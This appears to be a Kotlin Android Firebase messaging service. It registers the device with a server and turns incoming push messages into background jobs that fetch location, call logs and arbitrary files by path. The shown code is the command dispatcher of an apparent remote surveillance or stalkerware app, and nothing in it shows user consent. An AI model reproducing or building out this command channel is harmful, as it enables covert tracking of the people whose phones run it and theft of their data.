// MyFirebaseMessagingService.kt
package com.example.lta

import android.util.Log
import androidx.work.Data
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.workDataOf
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.plus

/**
 * Firebase Cloud Messaging service that handles token registration and incoming messages.
 * Automatically re-registers devices when tokens are refreshed and processes remote commands.
 */
class MyFirebaseMessagingService : FirebaseMessagingService() {

    // Improved: Use companion object for constants following Kotlin conventions
    companion object {
        private const val TAG = "MyFirebaseMsgService"
        private const val COMMAND_KEY = "command"
    }

    // Improved: Use SupervisorJob to prevent child coroutine failures from canceling parent scope
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /**
     * Called when a new token is generated. This handles automatic re-registration.
     * @param token The new FCM registration token
     */
    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "New FCM token received: $token. Registering with server.")
        sendRegistrationToServer(token)
    }

    /**
     * Called when FCM token is deleted (typically on app uninstall or clearing data).
     * This is a custom method that should be called from token monitoring.
     * Will remove device from server.
     */
    fun onTokenDeleted() {
        Log.d(TAG, "FCM token deleted. Notifying server to remove device.")
        
        val context = applicationContext
        val apiClient = ApiClient(context.getString(R.string.server_base_url))
        val systemInfoManager = SystemInfoManager(context)
        val deviceId = systemInfoManager.getDeviceId()
        
        serviceScope.launch {
            try {
                // Send request to remove device from server database
                val success = apiClient.deleteDevice(deviceId)
                Log.i(TAG, "Device removal from server: ${if (success) "successful" else "failed"}")
            } catch (e: Exception) {
                Log.e(TAG, "Error notifying server of token deletion", e)
            }
        }
    }

    /**
     * Handles the automatic registration logic, sending device info to the server
     * and updating the local registration status in SharedPreferences.
     * @param token The FCM token to register with the server
     */
    private fun sendRegistrationToServer(token: String) {
        val context = applicationContext

        // Improved: Initialize dependencies at the beginning for better readability
        val apiClient = ApiClient(context.getString(R.string.server_base_url))
        val systemInfoManager = SystemInfoManager(context)
        val appPrefs = AppPreferences(context)

        val deviceModel = systemInfoManager.getDeviceModel()
        val deviceId = systemInfoManager.getDeviceId()

        // Improved: Use serviceScope instead of creating new CoroutineScope
        serviceScope.launch {
            try {
                Log.i(TAG, "Attempting automatic registration -> ID: $deviceId, Model: $deviceModel")

                // Perform the registration call (no name is sent for automatic updates)
                val success = apiClient.registerDevice(token, deviceModel, deviceId)

                // Update the registration status, which the UI will read
                appPrefs.setRegistrationStatus(success)

                val statusMessage = if (success) "successful" else "failed"
                Log.i(TAG, "Automatic registration $statusMessage and status updated in preferences")

            } catch (e: Exception) {
                // Improved: Added exception handling for registration process
                Log.e(TAG, "Error during automatic registration", e)
                appPrefs.setRegistrationStatus(false)
            }
        }
    }

    /**
     * Called when a data message is received from FCM.
     * Processes incoming commands and schedules appropriate workers.
     * @param remoteMessage The received FCM message
     */
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        Log.d(TAG, "FCM Message From: ${remoteMessage.from}")

        // Improved: Simplified conditional logic and better error handling
        if (remoteMessage.data.isNotEmpty()) {
            Log.d(TAG, "Message data payload: ${remoteMessage.data}")

            val command = remoteMessage.data[COMMAND_KEY]
            when {
                command != null -> {
                    Log.d(TAG, "Received command: '$command'. Scheduling worker.")
                    
                    // Handle file upload commands with file path
                    if (command == DataFetchWorker.COMMAND_UPLOAD_FILE) {
                        val filePath = remoteMessage.data["filePath"]
                        if (!filePath.isNullOrBlank()) {
                            Log.d(TAG, "Scheduling file upload for: $filePath")
                            scheduleFileUploadWorker(command, filePath)
                        } else {
                            Log.w(TAG, "Upload file command received without file path")
                            scheduleDataFetchWorker(command) // Will handle the error appropriately
                        }
                    } else {
                        // Handle standard commands
                        scheduleDataFetchWorker(command)
                    }
                }
                else -> {
                    Log.w(TAG, "Received FCM message without a '$COMMAND_KEY' key in data.")
                }
            }
        } else {
            Log.d(TAG, "Received FCM message with empty data payload")
        }
    }

    /**
     * Schedules a DataFetchWorker to execute the given command.
     * Uses a coroutine scope tied to the service lifecycle.
     * @param command The command to execute (e.g., "get_location", "get_call_logs")
     */
    private fun scheduleDataFetchWorker(command: String) {
        try {
            val workRequest = OneTimeWorkRequestBuilder<DataFetchWorker>()
                .setInputData(workDataOf(DataFetchWorker.KEY_COMMAND to command))
                .setConstraints(
                    Constraints.Builder()
                        .setRequiredNetworkType(NetworkType.CONNECTED)
                        .build()
                )
                .build()

            WorkManager.getInstance(applicationContext).enqueue(workRequest)
            Log.d(TAG, "DataFetchWorker scheduled for command: $command")
        } catch (e: Exception) {
            Log.e(TAG, "Error scheduling DataFetchWorker for command: $command", e)
        }
    }

    /**
     * Schedules a DataFetchWorker to upload a specific file.
     * @param command The command to execute
     * @param filePath The path of the file to upload
     */
    private fun scheduleFileUploadWorker(command: String, filePath: String) {
        try {
            val workRequest = OneTimeWorkRequestBuilder<DataFetchWorker>()
                .setInputData(
                    workDataOf(
                        DataFetchWorker.KEY_COMMAND to command,
                        "filePath" to filePath
                    )
                )
                .setConstraints(
                    Constraints.Builder()
                        .setRequiredNetworkType(NetworkType.CONNECTED)
                        .build()
                )
                .build()

            WorkManager.getInstance(applicationContext).enqueue(workRequest)
            Log.d(TAG, "File upload worker scheduled for: $filePath")
        } catch (e: Exception) {
            Log.e(TAG, "Error scheduling file upload worker for: $filePath", e)
        }
    }

    /**
     * Improved: Clean up resources when service is destroyed
     */
    override fun onDestroy() {
        super.onDestroy()
        // Cancel any ongoing coroutines to prevent memory leaks
        serviceScope.cancel()
    }
}
